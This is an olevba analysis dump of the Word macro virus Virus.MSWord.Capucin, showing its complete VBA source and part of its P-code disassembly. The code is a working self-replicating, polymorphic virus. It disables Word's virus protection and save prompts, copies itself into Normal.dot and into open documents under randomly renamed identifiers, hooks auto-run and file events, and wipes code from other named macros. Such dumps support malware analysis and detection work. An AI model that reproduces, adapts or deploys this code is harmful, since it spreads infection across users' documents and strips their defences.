olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Capucin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Capucin - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO E3632SUSJGYN.bas 
in file: Virus.MSWord.Capucin - OLE stream: 'Macros/VBA/E3632SUSJGYN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public QODKQJAGBKSA(1 To 80) As String
Public QODKQJAGBKSA1(1 To 80) As String
Public QODKQJAGBKSA2(1 To 255) As String
Sub MUJBRSYCRXIJWVXB()
'On Error Resume Next
Randomize Timer ' ãåíåðàòîð ñëó÷. ÷èñåë
Dim YTKOKZSVVT As Boolean, XNLJNFCHB As Boolean
 ' ìàññèâ ñòðîê ñ íàçâàíèÿìè
Dim MCYKFQLHTEAE As String
QODKQJAGBKSA(1) = "E3632SUSJGYN": QODKQJAGBKSA(2) = "MUJBRSYCRXIJWVXB"
QODKQJAGBKSA(3) = "QODKQJAGBKSA": QODKQJAGBKSA(4) = "YTKOKZSVVT"
QODKQJAGBKSA(5) = "XNLJNFCHB": QODKQJAGBKSA(6) = "ZCULKTSYHFTKSPQZI"
QODKQJAGBKSA(7) = "DFWDEPOYDTIPI": QODKQJAGBKSA(8) = "FFJGFGKVFBENTJ"
QODKQJAGBKSA(9) = "SITZMNTXXNOPGF": QODKQJAGBKSA(10) = "MCYKFQLHTEAE"
QODKQJAGBKSA(11) = "TJDSTELPQDXBS": QODKQJAGBKSA(12) = "GJIHHZCUNN"
QODKQJAGBKSA(13) = "CADEVKFVUU": QODKQJAGBKSA(14) = "DCNFRKUH"
QODKQJAGBKSA(15) = "PQTHXOIJFIK": QODKQJAGBKSA(16) = "XNFAXYUIAJGQTUTOV"
QODKQJAGBKSA(17) = "VYYEZMNJZX": QODKQJAGBKSA(18) = "VFPEBFTAR"

QODKQJAGBKSA2(1) = "systems": QODKQJAGBKSA2(2) = "MacroBle"
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""
'QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = ""


YTKOKZSVVT = False ' ïðèçíàê çàðàæåííîñòè äîêóìåíòà
XNLJNFCHB = False ' ïðèçíàê çàðàæåííîñòè øàáëîíà Normal.dot
Options.ConfirmConversions = False ' îòêëþ÷åíèå çàïðîñà ïðè êîíâåðòàöèè ôàéëà
Options.VirusProtection = False ' îòêëþ÷åíèå âèðóñíîé çàùèòû
Options.SaveNormalPrompt = False ' âêëþ÷åíèå çàïðîñà íà ñîõðàíåíèå øàáëîíà Normal.dot
ActiveDocument.ReadOnlyRecommended = False 'Òåêóùèé äîêóìåíò äëÿ ÷òåíèÿ è çàïèñè

With NormalTemplate.VBProject.VBComponents
 For i = 1 To .Count ' ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â Normal
  If XNFAXYUIAJGQTUTOV(.Item(i).Name) Then
   XNLJNFCHB = True: XNLJNFCHBioner = .Item(i).Name
  Else
   For GJIHHZCUNN = 1 To 255
    If QODKQJAGBKSA2(GJIHHZCUNN) = "" Then Exit For
    If LCase(QODKQJAGBKSA2(GJIHHZCUNN)) = LCase(.Item(i).Name) Then .Item(i).CodeModule.DeleteLines 1, .Item(i).CodeModule.CountOfLines
   Next GJIHHZCUNN
  End If
 Next i
End With

With ActiveDocument.VBProject.VBComponents
 For i = 1 To .Count ' ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â òåêóùåì äîêóìåíòå
  If XNFAXYUIAJGQTUTOV(.Item(i).Name) Then
  YTKOKZSVVT = True: YTKOKZSVVTioner = .Item(i).Name
 Else
   For GJIHHZCUNN = 1 To 255
    If QODKQJAGBKSA2(GJIHHZCUNN) = "" Then Exit For
    If LCase(QODKQJAGBKSA2(GJIHHZCUNN)) = LCase(.Item(i).Name) Then .Item(i).CodeModule.DeleteLines 1, .Item(i).CodeModule.CountOfLines
   Next GJIHHZCUNN
  End If
 Next i
End With

If YTKOKZSVVT = False Then 'åñëè â òåêóùåì äîêóìåíòå íåò àíòèâèðóñà çíà÷èò áóäåò
   NormalTemplate.VBProject.VBComponents(XNLJNFCHBioner).Export XNLJNFCHBioner + ".bas"
   ZCULKTSYHFTKSPQZI = FreeFile
   VFPEBFTAR2
   Open XNLJNFCHBioner + ".bas" For Input As ZCULKTSYHFTKSPQZI
   ZCULKTSYHFTKSPQZI1 = FreeFile
   Open XNLJNFCHBioner + "1.bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE: Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close
   Open XNLJNFCHBioner + "1.bas" For Input As ZCULKTSYHFTKSPQZI
   Open XNLJNFCHBioner + ".bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE:
     MCYKFQLHTEAE = VFPEBFTAR1(MCYKFQLHTEAE)
     Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close
   ActiveDocument.VBProject.VBComponents.Import XNLJNFCHBioner + ".bas"
   Kill XNLJNFCHBioner + ".bas"
   Kill XNLJNFCHBioner + "1.bas"
End If

If XNLJNFCHB = False Then 'åñëè â Normal íåò àíòèâèðóñà çíà÷èò áóäåò
   ActiveDocument.VBProject.VBComponents(YTKOKZSVVTioner).Export YTKOKZSVVTioner + ".bas"
   VFPEBFTAR2
   ZCULKTSYHFTKSPQZI = FreeFile
   Open YTKOKZSVVTioner + ".bas" For Input As ZCULKTSYHFTKSPQZI
   ZCULKTSYHFTKSPQZI1 = FreeFile
   Open YTKOKZSVVTioner + "1.bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE: Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE + Chr(13) + Chr(10);
    Wend
   Close
   
   Open YTKOKZSVVTioner + "1.bas" For Input As ZCULKTSYHFTKSPQZI
   Open YTKOKZSVVTioner + ".bas" For Output As ZCULKTSYHFTKSPQZI1
    While Not EOF(ZCULKTSYHFTKSPQZI)
     Line Input #ZCULKTSYHFTKSPQZI, MCYKFQLHTEAE:
     MCYKFQLHTEAE = VFPEBFTAR1(MCYKFQLHTEAE)
     Print #ZCULKTSYHFTKSPQZI1, MCYKFQLHTEAE
    Wend
   Close ZCULKTSYHFTKSPQZI, ZCULKTSYHFTKSPQZI1
   
   NormalTemplate.VBProject.VBComponents.Import YTKOKZSVVTioner + ".bas"
   Kill YTKOKZSVVTioner + ".bas"
   Kill YTKOKZSVVTioner + "1.bas"
End If

If YTKOKZSVVT = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If XNLJNFCHB = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

End Sub
Sub FileSave()
 On Error Resume Next
 Call MUJBRSYCRXIJWVXB
End Sub
Sub FileClose()
 On Error Resume Next
 Call MUJBRSYCRXIJWVXB
End Sub
Sub FileOpen()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoOpen()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoClose()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub autonew()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Sub AutoExec()
 On Error Resume Next

 Call MUJBRSYCRXIJWVXB
End Sub
Function FFJGFGKVFBENTJ(SITZMNTXXNOPGF As Byte) As String
 Dim MCYKFQLHTEAE As String, TJDSTELPQDXBS As String
 Randomize Timer
 For GJIHHZCUNN = 1 To Int(Rnd(1) * SITZMNTXXNOPGF) + 8
  MCYKFQLHTEAE = Chr(Int(Rnd(1) * 26 + 65))
  TJDSTELPQDXBS = MCYKFQLHTEAE + TJDSTELPQDXBS
 Next GJIHHZCUNN
 FFJGFGKVFBENTJ = TJDSTELPQDXBS
End Function
Function CADEVKFVUU(DCNFRKUH As String) As String
 Dim PQTHXOIJFIK As Long, MCYKFQLHTEAE As String
 If DCNFRKUH <> "" Then
  MCYKFQLHTEAE = UCase(DCNFRKUH)
  For GJIHHZCUNN = 1 To Len(MCYKFQLHTEAE)
   PQTHXOIJFIK = PQTHXOIJFIK + Asc(Mid(MCYKFQLHTEAE, GJIHHZCUNN, 1))
  Next GJIHHZCUNN
  CADEVKFVUU = Left(DCNFRKUH, 1) + LTrim(Str(Len(LTrim(Str(PQTHXOIJFIK))))) + LTrim(Str(PQTHXOIJFIK)) + Right(DCNFRKUH, Len(DCNFRKUH) - 1)
 Else
  CADEVKFVUU = "1"
 End If
 
End Function

Function XNFAXYUIAJGQTUTOV(DCNFRKUH As String) As Boolean
 Dim PQTHXOIJFIK As Long, MCYKFQLHTEAE As String
 On Error Resume Next
 If Len(DCNFRKUH) > 10 Then
  MCYKFQLHTEAE = Left(DCNFRKUH, 1) + _
  Right(DCNFRKUH, Len(DCNFRKUH) - _
  (2 + Len(Mid(DCNFRKUH, 3, CInt(Mid(DCNFRKUH, 2, 1))))))
  If DCNFRKUH = CADEVKFVUU(MCYKFQLHTEAE) Then XNFAXYUIAJGQTUTOV = True Else XNFAXYUIAJGQTUTOV = False
 Else
  XNFAXYUIAJGQTUTOV = False
 End If
End Function
Function VFPEBFTAR1(MCYKFQLHTEAE As String) As String
 Dim PQTHXOIJFIK As Byte, MCYKFQLHTEAE3 As String
 MCYKFQLHTEAE3 = MCYKFQLHTEAE
 PQTHXOIJFIK = 1
 Do While (RTrim(QODKQJAGBKSA(PQTHXOIJFIK)) <> "" And PQTHXOIJFIK < 80)
  If PQTHXOIJFIK < 81 Then PQTHXOIJFIK = PQTHXOIJFIK + 1 Else Exit Do
 Loop
 For GJIHHZCUNN = 1 To PQTHXOIJFIK
  PQTHXOIJFIK1 = InStr(1, MCYKFQLHTEAE3, QODKQJAGBKSA(GJIHHZCUNN))
  Do While (PQTHXOIJFIK1 <> 0 And QODKQJAGBKSA(GJIHHZCUNN) <> "")
   MCYKFQLHTEAE1 = Left(MCYKFQLHTEAE3, PQTHXOIJFIK1 - 1)
   MCYKFQLHTEAE2 = Right(MCYKFQLHTEAE3, Len(MCYKFQLHTEAE3) - Len(MCYKFQLHTEAE1) - Len(QODKQJAGBKSA(GJIHHZCUNN)))
   MCYKFQLHTEAE3 = MCYKFQLHTEAE1 + QODKQJAGBKSA1(GJIHHZCUNN) + MCYKFQLHTEAE2
   PQTHXOIJFIK1 = InStr(1, MCYKFQLHTEAE3, QODKQJAGBKSA(GJIHHZCUNN))
  Loop
 Next GJIHHZCUNN
 VFPEBFTAR1 = MCYKFQLHTEAE3
End Function
Sub VFPEBFTAR2()
 PQTHXOIJFIK = 1
 Do While (RTrim(QODKQJAGBKSA(PQTHXOIJFIK)) <> "" And PQTHXOIJFIK < 80)
  If PQTHXOIJFIK < 81 Then PQTHXOIJFIK = PQTHXOIJFIK + 1 Else Exit Do
 Loop
 QODKQJAGBKSA1(1) = CADEVKFVUU(FFJGFGKVFBENTJ(20))
 For GJIHHZCUNN = 2 To PQTHXOIJFIK
  QODKQJAGBKSA1(GJIHHZCUNN) = FFJGFGKVFBENTJ(10)
 Next GJIHHZCUNN
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Capucin
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/E3632SUSJGYN - 12080 bytes
' Line #0:
' 	Dim (Public) 
' 	LitDI2 0x0001 
' 	LitDI2 0x0050 
' 	VarDefn QODKQJAGBKSA (As String)
' Line #1:
' 	Dim (Public) 
' 	LitDI2 0x0001 
' 	LitDI2 0x0050 
' 	VarDefn QODKQJAGBKSA1 (As String)
' Line #2:
' 	Dim (Public) 
' 	LitDI2 0x0001 
' 	LitDI2 0x00FF 
' 	VarDefn QODKQJAGBKSA2 (As String)
' Line #3:
' 	FuncDefn (Sub MUJBRSYCRXIJWVXB())
' Line #4:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #5:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' 	QuoteRem 0x0010 0x0016 " ãåíåðàòîð ñëó÷. ÷èñåë"
' Line #6:
' 	Dim 
' 	VarDefn YTKOKZSVVT (As Boolean)
' 	VarDefn XNLJNFCHB (As Boolean)
' Line #7:
' 	QuoteRem 0x0001 0x001A " ìàññèâ ñòðîê ñ íàçâàíèÿìè"
' Line #8:
' 	Dim 
' 	VarDefn MCYKFQLHTEAE (As String)
' Line #9:
' 	LitStr 0x000C "E3632SUSJGYN"
' 	LitDI2 0x0001 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0010 "MUJBRSYCRXIJWVXB"
' 	LitDI2 0x0002 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #10:
' 	LitStr 0x000C "QODKQJAGBKSA"
' 	LitDI2 0x0003 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000A "YTKOKZSVVT"
' 	LitDI2 0x0004 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #11:
' 	LitStr 0x0009 "XNLJNFCHB"
' 	LitDI2 0x0005 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0011 "ZCULKTSYHFTKSPQZI"
' 	LitDI2 0x0006 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #12:
' 	LitStr 0x000D "DFWDEPOYDTIPI"
' 	LitDI2 0x0007 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000E "FFJGFGKVFBENTJ"
' 	LitDI2 0x0008 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #13:
' 	LitStr 0x000E "SITZMNTXXNOPGF"
' 	LitDI2 0x0009 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "MCYKFQLHTEAE"
' 	LitDI2 0x000A 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #14:
' 	LitStr 0x000D "TJDSTELPQDXBS"
' 	LitDI2 0x000B 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000A "GJIHHZCUNN"
' 	LitDI2 0x000C 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #15:
' 	LitStr 0x000A "CADEVKFVUU"
' 	LitDI2 0x000D 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "DCNFRKUH"
' 	LitDI2 0x000E 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #16:
' 	LitStr 0x000B "PQTHXOIJFIK"
' 	LitDI2 0x000F 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0011 "XNFAXYUIAJGQTUTOV"
' 	LitDI2 0x0010 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #17:
' 	LitStr 0x000A "VYYEZMNJZX"
' 	LitDI2 0x0011 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VFPEBFTAR"
' 	LitDI2 0x0012 
' 	ArgsSt QODKQJAGBKSA 0x0001 
' Line #18:
' Line #19:
' 	LitStr 0x0007 "systems"
' 	LitDI2 0x0001 
' 	ArgsSt QODKQJAGBKSA2 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "MacroBle"
' 	LitDI2 0x0002 
' 	ArgsSt QODKQJAGBKSA2 0x0001 
' Line #20:
' 	QuoteRem 0x0000 0x002A "QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = """
' Line #21:
' 	QuoteRem 0x0000 0x002A "QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = """
' Line #22:
' 	QuoteRem 0x0000 0x002A "QODKQJAGBKSA(7) = "": QODKQJAGBKSA(8) = """
' Line #23:
' Line #24:
' Line #25:
' 	LitVarSpecial (False)
' 	St YTKOKZSVVT 
' 	QuoteRem 0x0013 0x001F " ïðèçíàê çàðàæåííîñòè äîêóìåíòà"
' Line #26:
' 	LitVarSpecial (False)
' 	St XNLJNFCHB 
' 	QuoteRem 0x0012 0x0028 " ïðèçíàê çàðàæåííîñòè øàáëîíà Normal.dot"
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	QuoteRem 0x0023 0x0029 " îòêëþ÷åíèå çàïðîñà ïðè êîíâåðòàöèè ôàéëà"
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0020 0x001B " îòêëþ÷åíèå âèðóñíîé çàùèòû"
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0021 0x0033 " âêëþ÷åíèå çàïðîñà íà ñîõðàíåíèå øàáëîíà Normal.dot"
' Line #30:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' 	QuoteRem 0x002B 0x0024 "Òåêóùèé äîêóìåíò äëÿ ÷òåíèÿ è çàïèñè"
' Line #31:
' Line #32:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' 	QuoteRem 0x0015 0x0029 " ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â Normal"
' Line #34:
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	ArgsLd XNFAXYUIAJGQTUTOV 0x0001 
' 	IfBlock 
' Line #35:
' 	LitVarSpecial (True)
' 	St XNLJNFCHB 
' 	BoS 0x0000 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	St XNLJNFCHBioner 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00FF 
' 	For 
' Line #38:
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA2 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #39:
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA2 0x0001 
' 	ArgsLd LCase 0x0001 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	ArgsLd LCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndWith 
' Line #44:
' Line #45:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	For 
' 	QuoteRem 0x0015 0x0034 " ïðîâåðêà íà íàëè÷èå òåëà âèðóñà â òåêóùåì äîêóìåíòå"
' Line #47:
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	ArgsLd XNFAXYUIAJGQTUTOV 0x0001 
' 	IfBlock 
' Line #48:
' 	LitVarSpecial (True)
' 	St YTKOKZSVVT 
' 	BoS 0x0000 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	St YTKOKZSVVTioner 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00FF 
' 	For 
' Line #51:
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA2 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #52:
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA2 0x0001 
' 	ArgsLd LCase 0x0001 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	ArgsLd LCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld i 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndWith 
' Line #57:
' Line #58:
' 	Ld YTKOKZSVVT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x001B 0x0034 "åñëè â òåêóùåì äîêóìåíòå íåò àíòèâèðóñà çíà÷èò áóäåò"
' Line #59:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld XNLJNFCHBioner 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #60:
' 	Ld Friend 
' 	St ZCULKTSYHFTKSPQZI 
' Line #61:
' 	ArgsCall VFPEBFTAR2 0x0000 
' Line #62:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI 
' 	LitDefault 
' 	Open (For Input)
' Line #63:
' 	Ld Friend 
' 	St ZCULKTSYHFTKSPQZI1 
' Line #64:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	LitDefault 
' 	Open (For Output)
' Line #65:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #66:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	Ld MCYKFQLHTEAE 
' 	LineInput 
' 	BoS 0x0000 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	Sharp 
' 	PrintChan 
' 	Ld MCYKFQLHTEAE 
' 	PrintItemNL 
' Line #67:
' 	Wend 
' Line #68:
' 	CloseAll 
' Line #69:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI 
' 	LitDefault 
' 	Open (For Input)
' Line #70:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	LitDefault 
' 	Open (For Output)
' Line #71:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #72:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	Ld MCYKFQLHTEAE 
' 	LineInput 
' 	BoS 0x0000 
' Line #73:
' 	Ld MCYKFQLHTEAE 
' 	ArgsLd VFPEBFTAR1 0x0001 
' 	St MCYKFQLHTEAE 
' Line #74:
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	Sharp 
' 	PrintChan 
' 	Ld MCYKFQLHTEAE 
' 	PrintItemNL 
' Line #75:
' 	Wend 
' Line #76:
' 	CloseAll 
' Line #77:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #78:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #79:
' 	Ld XNLJNFCHBioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #80:
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	Ld XNLJNFCHB 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x001A 0x0029 "åñëè â Normal íåò àíòèâèðóñà çíà÷èò áóäåò"
' Line #83:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld YTKOKZSVVTioner 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #84:
' 	ArgsCall VFPEBFTAR2 0x0000 
' Line #85:
' 	Ld Friend 
' 	St ZCULKTSYHFTKSPQZI 
' Line #86:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI 
' 	LitDefault 
' 	Open (For Input)
' Line #87:
' 	Ld Friend 
' 	St ZCULKTSYHFTKSPQZI1 
' Line #88:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	LitDefault 
' 	Open (For Output)
' Line #89:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #90:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	Ld MCYKFQLHTEAE 
' 	LineInput 
' 	BoS 0x0000 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	Sharp 
' 	PrintChan 
' 	Ld MCYKFQLHTEAE 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemSemi 
' 	PrintEoS 
' Line #91:
' 	Wend 
' Line #92:
' 	CloseAll 
' Line #93:
' Line #94:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI 
' 	LitDefault 
' 	Open (For Input)
' Line #95:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	LitDefault 
' 	Open (For Output)
' Line #96:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #97:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	Ld MCYKFQLHTEAE 
' 	LineInput 
' 	BoS 0x0000 
' Line #98:
' 	Ld MCYKFQLHTEAE 
' 	ArgsLd VFPEBFTAR1 0x0001 
' 	St MCYKFQLHTEAE 
' Line #99:
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	Sharp 
' 	PrintChan 
' 	Ld MCYKFQLHTEAE 
' 	PrintItemNL 
' Line #100:
' 	Wend 
' Line #101:
' 	Ld ZCULKTSYHFTKSPQZI 
' 	Ld ZCULKTSYHFTKSPQZI1 
' 	Close 0x0002 
' Line #102:
' Line #103:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #104:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0004 ".bas"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #105:
' 	Ld YTKOKZSVVTioner 
' 	LitStr 0x0005 "1.bas"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #106:
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	Ld YTKOKZSVVT 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #109:
' 	Ld XNLJNFCHB 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
